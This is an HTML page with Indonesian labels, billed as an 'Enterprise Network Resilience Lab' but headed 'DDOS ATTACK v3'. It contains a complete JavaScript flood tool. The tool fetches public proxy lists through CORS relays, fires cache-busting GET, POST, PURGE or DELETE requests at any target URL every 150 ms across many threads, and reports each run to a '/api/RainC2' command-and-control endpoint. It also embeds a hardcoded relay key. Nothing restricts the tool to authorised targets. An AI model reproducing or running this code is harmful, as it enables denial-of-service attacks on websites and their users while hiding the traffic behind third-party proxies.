<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enterprise Network Resilience Lab</title>
    <style>
        :root { --accent: #3b82f6; --bg: #09090b; --card: #18181b; --border: #27272a; --success: #22c55e; --error: #ef4444; }
        body { font-family: 'Inter', sans-serif; background: var(--bg); color: #fff; padding: 20px; line-height: 1.6; }
        .container { max-width: 1000px; margin: auto; background: var(--card); padding: 30px; border-radius: 12px; border: 1px solid var(--border); }
        .section { margin-bottom: 25px; padding: 20px; background: #111; border-radius: 10px; border: 1px solid var(--border); text-align:center; }
        h2 { margin-top: 0; font-size: 1.2rem; color: var(--accent); display: flex; align-items: center; gap: 10px; text-align: left; }
        label { display: block; margin-bottom: 8px; font-size: 13px; color: #a1a1aa; text-align: left; }
        textarea, input, select { width: 100%; padding: 12px; border-radius: 6px; border: 1px solid #3f3f46; background: #000; color: #fff; box-sizing: border-box; margin-bottom: 10px; }
        .btn-group { display: flex; gap: 10px; }
        button { flex: 1; padding: 12px; border-radius: 6px; border: none; font-weight: bold; cursor: pointer; transition: 0.3s; color: white; }
        .btn-run { background: var(--accent); }
        .btn-stop { background: var(--error); display: none; }
        .btn-clear { background: #3f3f46; }
        button:hover { opacity: 0.8; transform: translateY(-1px); }
        .log-container { margin-top: 20px; }
        .log-box { background: #000; padding: 15px; border-radius: 8px; font-family: 'Consolas', monospace; height: 250px; overflow-y: auto; font-size: 12px; border: 1px solid var(--border); border-left: 4px solid var(--accent); text-align: left; }
        .status-bar { display: flex; justify-content: space-between; margin-top: 10px; font-size: 12px; color: #a1a1aa; background: #111; padding: 10px; border-radius: 6px; }
        .method-tag { background: #2d2d30; padding: 2px 6px; border-radius: 4px; font-size: 11px; }
    </style>
</head>
<body>

<div class="container">
    <header style="text-align: center; margin-bottom: 30px;">
        <h1>🛡 DDOS ATTACK v3</h1>
        <p style="color: #a1a1aa;">Advanced Multi-Method Flood Controller</p>
    </header>

    <div class="section">
        <button class="btn-clear" onclick="clearLogs()">BERSIHKAN LOG</button>
    </div>

    <div class="section">
        <h2>🛠️ Execution Controller</h2>
        <div>
            <label>Target Endpoint (URL/IP)</label>
            <input type="text" id="target" placeholder="https://target-infrastruktur-anda.com">
        </div>
                <div style="display: flex; justify-content: space-between; align-items: center;">
            <div style="margin-right:5px">
                <label>Threads</label>
                <input type="number" id="threads" value="50" min="1">
            </div>
            <div>
                <label>Durasi (Detik)</label>
                <input type="number" id="time" value="60">
            </div>
            </div>
            <div>
                <label>HTTP Method</label>
                <select id="http-method">
                    <option value="GET">GET</option>
                    <option value="POST">POST</option>
                    <option value="PURGE">PURGE</option>
                    <option value="DELETE">DELETE</option>
                </select>
            </div>
            <div>
                <label>Proxy Type</label>
                <select id="proxy-type">
                    <option value="http">HTTP</option>
                    <option value="socks4">SOCKS4</option>
                    <option value="socks5">SOCKS5</option>
                    <option value="pubproxy">Public Proxy List</option>
                </select>
            </div>
        
        <label>Pilih Metode Analisis:</label>
        <select id="method">
            <option value="habibGMr9">habibGMr9 (Multi-Source Fetch)</option>
        </select>
        
        <div class="btn-group">
            <button id="run-btn" class="btn-run" onclick="startExecution()">MULAI ATTACK FLOODER</button>
            <button id="stop-btn" class="btn-stop" onclick="stopExecution()">HENTIKAN PENGUJIAN</button>
        </div>
    </div>

    <div class="log-container">
        <div class="status-bar">
            <span>Status: <b id="system-status">IDLE</b></span>
            <span>Requests Sent: <b id="request-count">0</b></span>
            <span>Proxies: <b id="proxy-count">0</b></span>
        </div>
        <div id="log" class="log-box"></div>
    </div>
</div>

<script>
    const logBox = document.getElementById('log');
    const runBtn = document.getElementById('run-btn');
    const stopBtn = document.getElementById('stop-btn');
    let executionTimer = null;
    let floodInterval = null;
    let totalSent = 0;
    const workerProxies = [
        "https://corsproxy.io/?key=8a51f9c2&url=",
        "https://api.allorigins.win/raw?url=",
        "https://proxy.corsfix.com/?url="
    ];
    const SECRET_NAME = "habibgm-venom-gem-cyber";

    function addLog(msg, type = 'info') {
        const time = new Date().toLocaleTimeString();
        let color = '#fff';
        if (type === 'success') color = '#4ade80';
        if (type === 'error') color = '#f87171';
        if (type === 'warn') color = '#fbbf24';
        logBox.innerHTML += `<div style="color: ${color}">[${time}] ${msg}</div>`;
        logBox.scrollTop = logBox.scrollHeight;
    }

    async function fetchProxies(type) {
        addLog(`Fetching ${type} proxies...`, "info");
        const proxyWorker = workerProxies[Math.floor(Math.random() * workerProxies.length)];
        let targetHabib;
        if (type === "pubproxy") targetHabib = 'https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt';
        else if (type === "socks4") targetHabib = 'https://raw.githubusercontent.com/officialputuid/KangProxy/refs/heads/KangProxy/socks4/socks4.txt';
        else if (type === "socks5") targetHabib = 'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/refs/heads/master/socks5.txt';
        else targetHabib = `https://api.proxyscrape.com/v2/?request=displayproxies&protocol=${type}&timeout=10000&country=all&ssl=all&anonymity=all`;
        let finalUrl = proxyWorker + encodeURIComponent(targetHabib);
        if (proxyWorker.includes("corsfix.com")) {
            finalUrl += `&apiKey=${encodeURIComponent(SECRET_NAME)}`;
        }
        try {
            const res = await fetch(finalUrl);
            const text = await res.text();
            const list = text.split('\n').filter(p => p.trim() !== "");
            document.getElementById('proxy-count').innerText = list.length;
            addLog(`Loaded ${list.length} proxies.`, "success");
            return list;
        } catch (err) {
            addLog("Failed to fetch proxies.", "error");
            return [];
        }
    }

    async function runDirectFlood(target, threads, httpMethod) {
        for (let i = 0; i < threads; i++) {
            const bypassUrl = target + (target.includes('?') ? '&' : '?') + 'cache=' + Math.random();
            const worker = workerProxies[Math.floor(Math.random() * workerProxies.length)];
            let finalUrl = worker + encodeURIComponent(bypassUrl);
            
            const options = {
                method: httpMethod,
                mode: 'no-cors',
                cache: 'no-cache',
                referrerPolicy: 'no-referrer'
            };
            
            if (httpMethod === "POST") {
                options.body = JSON.stringify({ data: Math.random().toString(36) });
            }

            fetch(finalUrl, options).then(() => {
                totalSent++;
                document.getElementById('request-count').innerText = totalSent;
            }).catch(() => {});
        }
    }

    async function startExecution(isResume = false) {
        const target = document.getElementById('target').value;
        const method = document.getElementById('method').value;
        const httpMethod = document.getElementById('http-method').value;
        const time = document.getElementById('time').value;
        const threads = document.getElementById('threads').value;
        const proxyType = document.getElementById('proxy-type').value;

        if (!target) return addLog("Target diperlukan!", "warn");

        totalSent = 0;
        const proxyList = await fetchProxies(proxyType);

        document.getElementById('system-status').innerText = "RUNNING";
        runBtn.style.display = 'none';
        stopBtn.style.display = 'block';

        addLog(`Flooding ${target} with ${httpMethod} [Threads: ${threads}]`, "success");

        floodInterval = setInterval(() => {
            runDirectFlood(target, threads, httpMethod);
        }, 150);

        try {
            await fetch('/api/RainC2', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ target, method, time, threads, proxyType, proxies: proxyList, httpMethod })
            });
        } catch (err) {}

        executionTimer = setTimeout(() => {
            stopExecution(true);
        }, time * 1000);
    }

    function stopExecution(auto = false) {
        clearInterval(floodInterval);
        clearTimeout(executionTimer);
        document.getElementById('system-status').innerText = "IDLE";
        runBtn.style.display = 'block';
        stopBtn.style.display = 'none';
        addLog(auto ? "Flooding selesai." : "Flooding dihentikan.", auto ? "success" : "error");
    }

    function clearLogs() {
        logBox.innerHTML = "";
        totalSent = 0;
        document.getElementById('request-count').innerText = "0";
    }
</script>
</body>
</html>
